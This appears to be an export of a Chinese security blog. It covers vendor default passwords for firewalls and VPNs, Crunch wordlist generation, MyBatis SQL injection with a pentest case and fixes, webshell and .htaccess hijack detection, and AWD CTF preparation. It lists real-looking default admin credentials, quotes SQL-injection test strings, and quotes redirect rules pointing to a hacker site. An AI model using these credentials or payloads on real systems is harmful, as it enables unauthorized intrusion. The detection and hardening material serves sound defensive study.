<td align="center">Huawei</td>
<td align="center">admin</td>
<td align="center">Admin@123</td>
</tr>
<tr>
<td align="center">深信服VPN</td>
<td align="center">51111端口</td>
<td align="center">delanrecover</td>
</tr>
<tr>
<td align="center">华为VPN</td>
<td align="center">root</td>
<td align="center">mduadmin</td>
</tr>
<tr>
<td align="center">华为防火墙</td>
<td align="center">admin</td>
<td align="center">Admin@123</td>
</tr>
<tr>
<td align="center">EudemonJuniper防火墙</td>
<td align="center">netscreen</td>
<td align="center">netscreen</td>
</tr>
<tr>
<td align="center">迪普</td>
<td align="center">admin</td>
<td align="center">admin_default</td>
</tr>
<tr>
<td align="center">安恒的明御防火墙</td>
<td align="center">admin</td>
<td align="center">adminadmin</td>
</tr>
<tr>
<td align="center">某堡垒机</td>
<td align="center">shterm</td>
<td align="center">shterm</td>
</tr>
<tr>
<td align="center">天融信的VPN</td>
<td align="center">test</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">奇安信所有产品</td>
<td align="center">Admin</td>
<td align="center">!1ws</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>路由器</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>默认密码</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下的字典生成工具Crunch，创造自己的专属字典</title>
    <url>/2018/05/15/WEB/Linux%E4%B8%8B%E7%9A%84%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7Crunch%EF%BC%8C%E5%88%9B%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%93%E5%B1%9E%E5%AD%97%E5%85%B8/</url>
    <content><![CDATA[<p> ![password.jpg](Linux下的字典生成工具Crunch，创造自己的专属字典/15256173123056.jpg!small<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201201906720.png" style="zoom:50%;"></p>
<p><strong>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。由其在渗透测试需要爆破的时候，字典的编排等直接影响到我们的爆破速度，对整个渗透测试流程起着十分重要的作用。</strong></p>
<a id="more"></a>

<h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">address : https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;crunch-wordlist&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>Crunch</strong>为<strong>kali</strong>自带工具之一在kali环境下进行，文中提及的所有命令均可以在kali下直接运行。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201201938900.png" alt="image-20201201201938900" style="zoom:50%;">

<h2 id="0x01-使用语法和参数"><a href="#0x01-使用语法和参数" class="headerlink" title="0x01 使用语法和参数"></a>0x01 使用语法和参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch &lt;min&gt; &lt;max&gt; [options]</span><br></pre></td></tr></table></figure>

<p>参数详解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">min    设定最小字符串长度（必选）</span><br><span class="line">max    设定最大字符串长度（必选）</span><br><span class="line"></span><br><span class="line">oprions</span><br><span class="line">-b     指定文件输出的大小，避免字典文件过大  </span><br><span class="line">-c     指定文件输出的行数，即包含密码的个数</span><br><span class="line">-d     限制相同元素出现的次数</span><br><span class="line">-e     定义停止字符，即到该字符串就停止生成</span><br><span class="line">-f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</span><br><span class="line">-i     改变输出格式，即aaa,aab -&gt; aaa,baa</span><br><span class="line">-I     通常与-t联合使用，表明该字符为实义字符</span><br><span class="line">-m     通常与-p搭配</span><br><span class="line">-o     将密码保存到指定文件</span><br><span class="line">-p     指定元素以组合的方式进行</span><br><span class="line">-q     读取密码文件，即读取pass.txt</span><br><span class="line">-r     定义重某一字符串重新开始</span><br><span class="line">-s     指定一个开始的字符，即从自己定义的密码xxxx开始</span><br><span class="line">-t     指定密码输出的格式</span><br><span class="line">-u     禁止打印百分比（必须为最后一个选项）</span><br><span class="line">-z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  </span><br></pre></td></tr></table></figure>

<p>特殊字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%      代表数字</span><br><span class="line">^      代表特殊符号</span><br><span class="line">@      代表小写字母</span><br><span class="line">,      代表大写字符   </span><br></pre></td></tr></table></figure>

<h2 id="0x02-实用案例"><a href="#0x02-实用案例" class="headerlink" title="0x02 实用案例"></a>0x02 实用案例</h2><p>（1）生成一个字典文件，用自己指定的字符（默认为26个小写字母为元素的所有组合）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 1 3 123</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202202799.png" alt="image-20201201202202799" style="zoom:50%;">

<p>（2）若字典中需要空格，;等用双引号来表示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 3 3 &quot;ab &quot;</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202253335.png" alt="image-20201201202253335" style="zoom:50%;">

<p>（3）生成几个元素的组合（可以用于社工中收集的信息）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -p zhangsan 2018 0101 ..</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202347907.png" alt="image-20201201202347907" style="zoom:50%;">

<p>（4）生成指定的字符串（比如生成编号，手机号等）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 10 10 -t 201800%%%%</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202447905.png" alt="image-20201201202447905" style="zoom:50%;">

<p>（5）多种组合 生成3个元素的组合，前三位为定义的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 3 3 -t d@% -p aaa bbb </span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202547817.png" alt="image-20201201202547817" style="zoom:50%;">

<p>（6）通过-l参数来使@,%^等特殊字符输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 7 7 -t p@ss,%^ -l a@aaaaa</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202715831.png" alt="image-20201201202715831" style="zoom:50%;">

<p>（7）-o参数也可使用&gt;&gt;来简化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -d 2@ -t @@@% &gt;&gt; test.txt</span><br></pre></td></tr></table></figure>

<h2 id="0x03-调用密码库"><a href="#0x03-调用密码库" class="headerlink" title="0x03 调用密码库"></a>0x03 调用密码库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202800863.png" alt="image-20201201202800863" style="zoom:50%;">

<p>特殊字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numeric     表示0123456789</span><br><span class="line">Lalpha      表示26位小写字母</span><br><span class="line">Ualpha      表示26位大写字母</span><br></pre></td></tr></table></figure>

<p>实例：调用密码库 charset.lst中的 hex-upper项目字符，生成4位密码，其中格式为@ + hex-upper +% +%</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -f charset.lst hex-upper -t @@%% -l @xdd</span><br></pre></td></tr></table></figure>

<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>你也可以根据自己需要的字符自己编写密码库文件来完成对特殊字典的编写，来创造自己的专属字典。</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>crunch</tag>
      </tags>
  </entry>
  <entry>
    <title>mybatis框架sql注入针对性渗透测试与修复</title>
    <url>/2020/09/13/WEB/mybatis%E6%A1%86%E6%9E%B6sql%E6%B3%A8%E5%85%A5%E9%92%88%E5%AF%B9%E6%80%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<p>mybatis框架sql注入针对性渗透测试与修复</p>
<p>0X00背景</p>
<p>在国内，政府、国企、央企等重点单位的内网应用系统基本都以JAVA为主。由于重点单位对于应用系统的性能、功能、扩展性等各方面及厂商开发快速性要求，SSM框架成为系统架构首选。这种情况下，有必要对梳理SSM框架相关的渗透测试入侵点。本文将针对Mybatis框架易发生注入的点做简单讨论。</p>
 <a id="more"></a>

<p>0X01 Mybatis概述</p>
<p>Mybatis是支持定制化的SQL、存储过程以及高级映射的优秀的持久层框架。</p>
<p>避免了几乎所有的JDBC代码，手动设置参数以及获取结果集的操作。可以对配置和原生的Map使用简单的XML或注解，将接口和java的POJOs映射成数据库中的记录，极大提高了开发效率。</p>
<p>因为框架避免了用户直接进行SQL语句的拼接，以至于部分开发或安全同学认为只要使用了Mybatis框架，就可以杜绝SQL注入。显然这是不可能的，须知没有免费的午餐，惰性永存，作为安全从业者的我们就是在对抗人性的缺点。</p>
<p>接下来，我们首先了解Mybatis在配置SQL语句时候的两种描述参数的方式</p>
<p>一种为：#{}</p>
<p>一种为：${}</p>
<p>比如</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsBretYk.jpg" alt="img" style="zoom:50%;"> 



<p>这个语句selectPerson,接受一个int(或integer)类型的参数，并返回一个hashmap类型的对象。</p>
<p>注意这里的参数符号是：#{id}</p>
<p>该情况下，Mybatis会创建一个预处理语句参数，通过JDBC，这样的一个参数在SQL中会由一个“？”来标识，并传递到一个新的预处理语句当中，就像这样：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsYYuKjL.jpg" alt="img" style="zoom:50%;"> 



<p>那么用$代替#来描述参数会发生什么？</p>
<p>这种情况下，框架会直接把变量拼接到SQL语句当中，不会做其他的处理。就相当于直接字符串拼接SQL语句。</p>
<p>综上：使用#格式的语法，框架会创建预处理语句属性并安全地设置值，这样做安全，迅速，通常也是首选做法。然而有时只是想直接在SQL语句中插入一个不改变的字符串。比如，像ORDER BY,可以这样来使用: ORDER BY S{columnName}。这里MyBatis不会修改或转义字符串。但显然，这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的SQL注入攻击，</p>
<p>0X03 误用场景</p>
<p>通过上部分的讨论，我们知道使用#符号，Mybatis会进行预编译来处理参数，这样可以有效的避免SQL注入。</p>
<p>那么假如所有人都正确使用了#，也就不存在安全问题了。事实却恰恰相反，总有错误的用法，所以咱们才不会失业。</p>
<p>在程序中，如order by字段、表名等，是无法使用预编译语句的，在like参数、in参数、order by这种尝试用拼接逻辑的场景下，开发同学总会给系统留下一点彩蛋。所以在实际测试当中，能聚焦这方面，有针对性的进行漏洞的挖掘，才可以达到事倍功半的效果。</p>
<p>1、 like参数注入</p>
<p>错误写法示例：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsiBde58.jpg" alt="img" style="zoom:50%;"> 

<p>正确写法</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsvyNv3H.jpg" alt="img" style="zoom:50%;"> 

<p>对于Oracle可以通过’%’||’#param#’||’%’避免；</p>
<p>对于MySQL可以通过CONCAT(‘%’,#param#,’%’)避免；</p>
<p>对于MSSQL中通过’%’+#param#+’% 。</p>
<p>2 、in参数的SQL注入</p>
<p>错误写法示例：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsYxgZ05.jpg" alt="img" style="zoom:50%;"> 

<p>正确写法</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpscRshyZ.jpg" alt="img" style="zoom:50%;"> 



<p>3、Order by SQL注入</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsVualOA.jpg" alt="img" style="zoom:50%;"> 

<p>因为预编译机制只能处理查询参数，此处显然不是查询参数，是一种错误的写法，因此order by位置的参数需要开发人员自己处理。所以只能使用$去拼接：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsFLmRAr.jpg" alt="img" style="zoom:50%;"> 







<p>针对这种情况要在代码中做过滤、使用转义等方式处理字符，避免改变SQL逻辑。</p>
<p>其实也可以在xml中处理，用if去判断，这样就显得比较硬编码，sql语句会增加较多，显得臃肿，不便阅读。</p>
<p>通过上面的分析，我们了解到使用了mybatis框架容易误用的地方，可以有针对性的对部分功能展开渗透测试。</p>
<p>0X04 真实案列</p>
<p>某单位系统登陆页面未做验证码验证，进一步验证发现未对失败次数做限制，存在可爆破漏洞。同时是服务单位客户系统，存在弱密码可能极大。对于弱密码是有着永远说不完的话题，正好可以利用一波。</p>
<p>通过前期的信息收集，针对性制作弱密码字典，开始爆破行动。</p>
<p>反复尝试了几次，发现账户、密码正确，成功登陆系统。</p>
<p>接下来针对系统作进一步的渗透测试，因为有mybatis框架，我们只需要针对性测试上文总结的几处场景：</p>
<p>系统存在多处查询功能，查询用户名，会用like方式，猜测此处存在sql注入。</p>
<p>抓包手动测试：</p>
<p>‘ or ‘1’=‘0</p>
<p>‘ and ‘1’=‘1</p>
<p>返回结果明显不同，存在sql注入。</p>
<p>直接测模糊查询功能模块，得到多枚SQL注入。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsIZq2D9.jpg" alt="img"> </p>
<p>Sqlmap结果，Oracle数据库，3个库。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wps7EWkhy.jpg" alt="img" style="zoom:50%;"> 



<p>通过源代码进行修复</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsdraGDp.jpg" alt="img" style="zoom:50%;"> 



<p>我们前面提到like参数场景下的修复方式，如上图在LIKE后面跟 ‘%’||#{字段名}||’%’即可修复。</p>
<p>作为小白一次完整的mybatis框架sql注入针对性渗透测试与修复结束，望大佬们勿喷，请指点。</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Sql注入</tag>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>检测PHP网站是否被攻破的方法</title>
    <url>/2020/09/13/WEB/%E6%A3%80%E6%B5%8BPHP%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E8%A2%AB%E6%94%BB%E7%A0%B4%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p><strong>0x01 查看访问日志</strong></p>
<p><strong>查看是否有文件上传操作</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IPREMOVED - - [01&#x2F;Mar&#x2F;2013:06:16:48 -0600] &quot;POST&#x2F;uploads&#x2F;monthly_10_2012&#x2F;view.php HTTP&#x2F;1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla&#x2F;5.0&quot; IPREMOVED - - [01&#x2F;Mar&#x2F;2013:06:12:58 -0600] &quot;POST&#x2F;public&#x2F;style_images&#x2F;master&#x2F;profile&#x2F;blog.php HTTP&#x2F;1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla&#x2F;5.0&quot;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p><strong>nginx默认记录的日志格式为：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">access_log logs&#x2F;access.log</span><br></pre></td></tr></table></figure>

<p><strong>或</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">access_log logs&#x2F;access.log combined;</span><br></pre></td></tr></table></figure>

<p><strong>nginx默认记录日志的位置为</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx安装目录&#x2F;log&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>iis默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%inetpub%\logs\LogFiles</span><br></pre></td></tr></table></figure>

<p><strong>apache默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%apache%\logs\error.log</span><br></pre></td></tr></table></figure>

<p><strong>weblogic默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%base_domain%\servers\AdminServer\logs\</span><br></pre></td></tr></table></figure>

<p><strong>0x02 查找还有恶意的php代码文件</strong></p>
<p><strong>2.1查找最近发生变化的php文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; -mtime -7</span><br><span class="line"></span><br><span class="line">-type表示搜索一般文件，-mtime -7表示7*24小时内修改的文件</span><br></pre></td></tr></table></figure>



<p>结果可能如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;uploads&#x2F;monthly_04_2008&#x2F;index.php .&#x2F;uploads&#x2F;monthly_10_2008&#x2F;index.php .&#x2F;uploads&#x2F;monthly_08_2009&#x2F;template.php .&#x2F;uploads&#x2F;monthly_02_2013&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p><strong>2.2 查找文件中是否存在疑似代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;eval *(&quot; --color</span><br></pre></td></tr></table></figure>

<p><strong>*( 代表任意个空格</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;base64_decode *(&quot; --color find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;gzinflate *(&quot; --color find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;eval *(str_rot13 *(base64_decode *(&quot; --color</span><br></pre></td></tr></table></figure>

<p>注解：很多命令不支持管道传递参数，而实际上又需要这样，所以就用了<strong>xargs命令，这个命令可以用来管道传递参数</strong>；<strong>grep -l表示只包含某个字符串的文件名</strong>，如果去掉-l则会显示匹配特定字符串的行内容</p>
<p>几个特殊字符串的意义: </p>
<p><strong>eval()**</strong>把字符串按照php代码来执行，是最常见的php一句话木马**</p>
<p><strong>base64_decode()</strong> <strong>将字符串base64解码，攻击的时候payload是base64编码，则这个函数就有用武之地了</strong></p>
<p><strong>gzinflate()</strong> <strong>将字符串解压缩处理，攻击的时候payload用gzdeflate压缩之后，使用这个函数进行解压缩</strong></p>
<p><strong>str_rot13()</strong> <strong>对字符串进行rot13编码</strong></p>
<p>也可以使用正则表达式来搜索文件，查找可以代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*php&#39; | xargs egrep -i &quot;(mail|fsockopen|pfsockopen|stream\_socket\_client|exec|system|passthru|eval|base64_decode) *(&quot;</span><br></pre></td></tr></table></figure>

<p>下面解释webshell常用的函数：</p>
<p><strong>mail()：**</strong>可用来向网站用户发送垃圾邮件**</p>
<p><strong>fsockopen()**</strong>:打开一个网络连接或者一个unix套接字连接，可用于payload发送远程请求**</p>
<p><strong>pfsockopen()**</strong>:和<strong><strong>fsockopen()</strong></strong>作用类似**</p>
<p><strong>stream_socket_client()**</strong>:建立一个远程连接，**</p>
<p><strong>例子如下：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php $fp &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;www.example.com:80&quot;, $errno, $errstr, 30);   if (!$fp) &#123;     echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;   &#125; else &#123;     fwrite($fp, &quot;GET &#x2F; HTTP&#x2F;1.0\r\nHost: www.example.com\r\nAccept: *&#x2F;*\r\n\r\n&quot;);     while (!feof($fp)) &#123;       echo fgets($fp, 1024);     &#125;     fclose($fp);   &#125;   ?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>exec()**</strong>:命令执行函数**</p>
<p><strong>system()**</strong>:同<strong>**exec()</strong></p>
<p><strong>passthru()**</strong>:同<strong>**exec()</strong></p>
<p>preg_replace()正则表达式由修饰符”e”修饰的时候，替换字符串在替换之前需要按照php代码执行，这种情况也需要考虑到，这种情况可采用这种以下扫搜：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs egrep -i &quot;preg_replace *\(([&#39;|\&quot;])(.).*\2[a-z]*e[^\1]*\1 *,&quot; --color</span><br></pre></td></tr></table></figure>

<p><strong>0x03 比较代码文件</strong></p>
<p>这种情况需要有一份干净的代码，这份代码和正在使用的代码进行比较。例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff -r wordpress-clean&#x2F; wordpress-compromised&#x2F; -x wp-content</span><br></pre></td></tr></table></figure>

<p>上面的例子是比较wordpress-clean/ 和wordpress-comprised/两个目录，并且目录里面的wp-content/子目录不比较</p>
<p><strong>0x04 搜寻可写的目录</strong></p>
<p>看看这个目录里面是否有可疑的文件，如下脚本查找权限为777的目录是否存在php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search_dir&#x3D;$(pwd) writable_dirs&#x3D;$(find $search_dir -type d -perm 0777) for dir in $writable_dirs    do        #echo %dir        find $dir -type -f -name &#39;*.php&#39; done        </span><br></pre></td></tr></table></figure>

<p><strong>黑客经常在jpg中插入php代码，因此在查询这些目录的时候也要查询jpg文件：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find wp-content&#x2F;uploads -type f -iname &#39;*.jpg&#39; | xargs grep -i php</span><br></pre></td></tr></table></figure>

<p><strong>注意：-iname 表示文件名不区分大小写 grep -i 也表示不区分大小写</strong></p>
<p><strong>0x05 检测iframe标签</strong></p>
<p>黑客经常做的是嵌入iframe标签，因此可以查看网页的源代码，并且搜索其中是否存在iframe标签，可使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -i &#39;&lt;iframe&#39; mywebsite.txt</span><br></pre></td></tr></table></figure>

<p>对于动态生成的页面，可使用firefox的<a href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/">Live HTTP Headers</a>插件，下载到源码之后再查找是否存在iframe标签</p>
<p><strong>0x06 查找数据库中是否存在敏感字符串</strong></p>
<p>包括%base64_%、%eval(% 等上面提到的一些关键字</p>
<p><strong>0x07 检查.htacess文件</strong></p>
<p>是否包含了auto_prepend_file和auto_append_file，使用如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;\.htaccess&#39; | xargs grep -i auto_prepend_file find . -type f -name &#39;\.htaccess&#39; | xargs grep -i auto_append_file</span><br></pre></td></tr></table></figure>

<p><strong>注释：.htacess</strong></p>
<p><strong>（</strong>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<strong>）</strong></p>
<p><strong>uto_prepend_file**</strong>的作用是加载当前脚本文件之前，先加载的php脚本 auto_append_file的作用是加载当前脚本文件之后，再加载的php脚本。黑客如果这么修改了.htaccess文件，那么可以在访问.htaccess目录的php脚本时，加载上自己想要加载的恶意脚本 .**</p>
<p>htaccess文件还可以被用来把访问网站的流量劫持到黑客的网站</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RewriteCond %&#123;HTTP_USER_AGENT&#125;^.*Baiduspider.*$ Rewriterule ^(.*)$ http:&#x2F;&#x2F;www.hacker.com&#x2F;muma.php [R&#x3D;301]</span><br></pre></td></tr></table></figure>

<p><strong>将baidu爬虫的访问重定向到黑客的网站(包含HTTP_USER_AGENT和http关键字)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; ^.*baidu.com.*$ Rewriterule ^(.*)$ http:&#x2F;&#x2F;www.hacker.com&#x2F;muma.php [R&#x3D;301]</span><br></pre></td></tr></table></figure>

<p><strong>将来自baidu搜索引擎的流量重定向到黑客的网站(包含HTTP_REFERER和http关键字)</strong> </p>
<p>为了查看网站是否被.htaccess修改导致流量劫持，可以在搜索.htaccess文件的时候采用如下命令： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;\.htaccess&#39; | xargs grep -i http; find . -type f -name &#39;\.htaccess&#39; | xargs grep -i HTTP_USER_AGENT;  find . -type f -name &#39;\.htaccess&#39; | xargs grep -i HTTP_REFERER</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>PHP网站</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF线下AWD流程和准备工作</title>
    <url>/2019/06/21/CTF/CTF%E7%BA%BF%E4%B8%8BAWD%E6%B5%81%E7%A8%8B%E5%92%8C%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="0x00-AWD"><a href="#0x00-AWD" class="headerlink" title="0x00 AWD"></a>0x00 AWD</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/11111.jpeg" alt="img"></p>
<p>AWD：Attack With Defence，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
<ol>
<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
<li>可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析；</li>
<li>flag在主办方的设定下每隔一定时间刷新一轮；</li>
<li>各队一般都有自己的初始分数；</li>
<li>flag一旦被其他队伍拿走，该队扣除一定积分；</li>
<li>扣除的积分由获取flag的队伍均分；</li>
<li>主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分；</li>
<li>一般每个队伍会给一个低权限用户，非root权限；</li>
</ol>
<p>你需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分。也就是说，攻击别人的靶机可以获取 Flag 分数时，别人会被扣分，同时你也要保护自己的主机不被别人得分，以防扣分。</p>
<a id="more"></a>

<h2 id="0x02-赛前准备"><a href="#0x02-赛前准备" class="headerlink" title="0x02 赛前准备"></a>0x02 赛前准备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 各种软件包，如 Python、CURL 等等，以备机器上没有而陷入尴尬 </span><br><span class="line">2. 一大堆 EXP 库和漏洞库，可以放个乌云的虚拟机备用</span><br><span class="line">3. 加固、基线检查脚本</span><br><span class="line">4. WAF 代码和部署脚本</span><br><span class="line">5. AWD 专用的批量拿 Webshell、批量交 flag、批量维持权限的基本代码或小框架</span><br></pre></td></tr></table></figure>

<p>比赛前可以准备一个脚本集，集成到一个框架中，这样打AWD会很流畅</p>
<h2 id="0x03-人员分工"><a href="#0x03-人员分工" class="headerlink" title="0x03 人员分工"></a>0x03 人员分工</h2><p>线下赛一般3人左右，2人攻击，1人防御，发现的漏洞可以攻击其他队伍，也要进行修复，所以攻防相辅相成，以攻为守。</p>
<p>比赛中每个队伍可能会维护多个靶机，web、二进制等，也可以每人负责一台，各自负责攻击和防御。</p>
<h2 id="0x04-防守流程"><a href="#0x04-防守流程" class="headerlink" title="0x04 防守流程"></a>0x04 防守流程</h2><h3 id="1-修改ssh密码"><a href="#1-修改ssh密码" class="headerlink" title="1.修改ssh密码"></a>1.修改ssh密码</h3><p>官方在给出服务器密码时，很有可能是默认的，这个时候需要比较手速了，需要赶快修改自己的密码并尝试能不能登录别人的靶机，还有很多时候会只给出一个ip需要尽快做端口的爆破以及修改</p>
<h3 id="2-备份网站源码和数据库。"><a href="#2-备份网站源码和数据库。" class="headerlink" title="2.备份网站源码和数据库。"></a>2.备份网站源码和数据库。</h3><p>一、防止自己修改网站源码或数据库后无法恢复</p>
<p>二、防止对手入侵主机删除源码服务无法正常运行</p>
<p>ps:   比赛会check服务是否正常，不正常会进行扣分</p>
<h4 id="1-备份网站源码"><a href="#1-备份网站源码" class="headerlink" title="1.备份网站源码"></a>1.备份网站源码</h4><p>（1）</p>
<p>使用xftp，filezilla client，xshell等工具 将源码备份下来</p>
<p>（2）使用scp命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -r -P Port remote_username@remote_ip:remote_folder local_file</span><br></pre></td></tr></table></figure>



<h4 id="2-备份数据库"><a href="#2-备份数据库" class="headerlink" title="2.备份数据库"></a>2.备份数据库</h4><p>（1）备份</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqldump -h127.0.0.1 -uroot -ppass database &gt; d:&#x2F;backupfile.sql</span><br></pre></td></tr></table></figure>

<p>（2）还原</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;lib&#x2F;mysql                  &#x2F;&#x2F;切换mmysql库目录</span><br><span class="line">mysql -uroot -ppass database&lt;backupfile.sql</span><br></pre></td></tr></table></figure>



<h3 id="3-检查系统安全性"><a href="#3-检查系统安全性" class="headerlink" title="3.检查系统安全性"></a>3.检查系统安全性</h3><p>关闭无需开放的端口、检查端口以及服务弱口令，mysql默认密码等，是否做了ssh登录限制，这里建议使用脚本统一完成</p>
